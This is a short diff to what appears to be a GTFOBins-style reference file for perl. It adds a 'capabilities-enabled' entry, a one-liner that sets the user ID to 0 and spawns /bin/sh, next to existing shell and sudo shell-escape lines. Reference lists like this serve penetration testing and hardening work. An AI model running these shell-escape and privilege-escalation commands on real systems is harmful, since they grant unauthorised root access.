@@ -12,4 +12,6 @@ functions:
     - code: ./perl -e 'exec "/bin/sh";'
   sudo-enabled:
     - code: sudo perl -e 'exec "/bin/sh";'
+  capabilities-enabled:
+    - code: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ---
